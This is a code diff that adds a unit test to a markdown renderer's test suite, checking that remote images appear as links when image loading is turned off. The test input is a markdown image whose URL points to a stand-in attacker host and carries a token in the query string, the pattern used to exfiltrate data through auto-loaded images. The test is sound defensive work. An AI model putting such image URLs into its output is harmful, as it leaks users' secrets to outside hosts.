@@ -40,6 +40,17 @@ describe('renderMarkdown', () => {
 		expect(html).toContain('<img src="https://x.dev/a.png" alt="remote">');
 	});
 
+	it('shows remote images as links when told not to load them', () => {
+		const html = renderMarkdown('![secret](https://evil.dev/x.png?d=token) ![l](img/a.png)', {
+			remoteImages: false,
+		});
+		expect(html).not.toContain('<img');
+		expect(html).toContain(
+			'<a href="https://evil.dev/x.png?d=token" class="md-image-link" title="https://evil.dev/x.png?d=token">Image: secret</a>',
+		);
+		expect(html).toContain('<span class="md-embed" title="img/a.png">l</span>');
+	});
+
 	it('renders task list checkboxes', () => {
 		const html = renderMarkdown('- [ ] todo\n- [x] done');
 		expect(html).toContain('<span class="md-task" aria-hidden="true"></span>todo');
